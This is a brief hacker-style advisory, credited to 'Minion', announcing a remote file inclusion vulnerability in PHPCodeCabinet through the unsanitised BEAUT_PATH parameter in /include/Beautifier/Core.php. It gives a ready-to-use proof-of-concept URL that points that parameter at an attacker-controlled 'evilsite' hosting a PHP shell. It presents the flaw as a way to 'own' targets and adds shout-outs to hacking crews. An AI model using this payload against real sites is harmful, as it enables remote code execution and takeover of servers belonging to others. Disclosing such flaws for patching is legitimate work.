>>From Minion:

PHPCodeCabinet (all versions) is vulnerable to a remote file include.

The vulnerable code is in /include/Beautifier/Core.php

an $BEAUT_PATH Was not properly scrubbed, so they got owned.

Proof of concept:

*target phpcodecabinet
directory*/include/Beautifier/Core.php?BEAUT_PATH=*evilsite*/Beautifier/HFile.php

HFile.php would be your php shell.

Shouts to XoRcrew & Disruptiv.
